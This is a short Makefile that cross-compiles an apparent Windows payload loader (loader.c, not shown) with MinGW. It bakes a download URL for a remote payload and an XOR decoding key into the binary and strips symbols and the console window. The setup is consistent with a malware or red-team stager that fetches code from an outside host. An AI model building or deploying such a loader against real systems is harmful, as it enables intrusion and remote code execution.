# Makefile — cross-compile loader.c (Linux → Windows x64) via MinGW
#
# Usage:
#   make PAYLOAD_URL="http://10.2.20.200:8080/x" XOR_KEY="aabbccdd"
#
# Requirements:
#   apt install gcc-mingw-w64-x86-64

CC      := x86_64-w64-mingw32-gcc
TARGET  := loader.exe
SRC     := loader.c

# Defaults — override on the command line
PAYLOAD_URL ?= http://127.0.0.1:8080/payload
XOR_KEY     ?= deadbeef

CFLAGS  := -O2 -s -mwindows \
           -Wall -Wno-unused-parameter \
           -DPayloadURL=\"$(PAYLOAD_URL)\" \
           -DXORKey=\"$(XOR_KEY)\"

LDFLAGS := -lwinhttp -lkernel32

.PHONY: all clean check-cc

all: check-cc $(TARGET)

check-cc:
	@which $(CC) >/dev/null 2>&1 || \
		{ echo "ERROR: $(CC) not found — run: apt install gcc-mingw-w64-x86-64"; exit 1; }

$(TARGET): $(SRC)
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)
	@echo "[+] Built: $@ (PayloadURL=$(PAYLOAD_URL) XORKey=$(XOR_KEY))"

clean:
	rm -f $(TARGET)
